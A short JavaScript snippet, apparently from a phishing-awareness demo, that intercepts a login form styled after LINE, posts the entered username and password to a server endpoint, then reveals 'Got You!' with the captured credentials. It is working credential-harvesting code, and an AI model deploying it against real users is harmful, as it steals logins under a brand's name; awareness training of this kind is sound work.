    <script>
        //modify

        document.querySelector("form").addEventListener("submit", function (event) {
            event.preventDefault(); // 阻止表單提交

            var username = document.querySelector("input[name='tid']").value;
            var password = document.querySelector("input[name='tpasswd']").value;
            const data = {
                username: username,
                password: password,
            };
            if (!username && !password) {
                return;
            }
            fetch('/api/line', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
                .then(response => response.text())
                .then(data => {
                    alert("帳號: " + username + "\n密碼: " + password + "\nGot You！中招了！這裡是UNE，不是LINE喔！！");
                })
                .catch(error => console.error('Error fetching data:', error));


        });

    </script>
